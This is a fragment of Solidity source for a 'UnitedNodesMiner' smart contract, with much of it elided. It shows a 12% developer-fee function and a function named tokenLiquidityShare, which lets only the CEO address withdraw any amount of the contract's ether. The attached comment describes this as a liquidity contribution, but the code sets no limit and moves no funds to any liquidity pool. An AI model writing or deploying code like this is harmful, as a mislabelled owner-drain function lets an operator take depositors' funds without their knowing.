...
contract UnitedNodesMiner{
    ...
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,12),100);
    }
    function tokenLiquidityShare(uint amount) public {
		require(msg.sender == ceoAddress);
    	msg.sender.transfer(amount);
	} //percentage of contract will be put in to liquidity of "UDS" Token
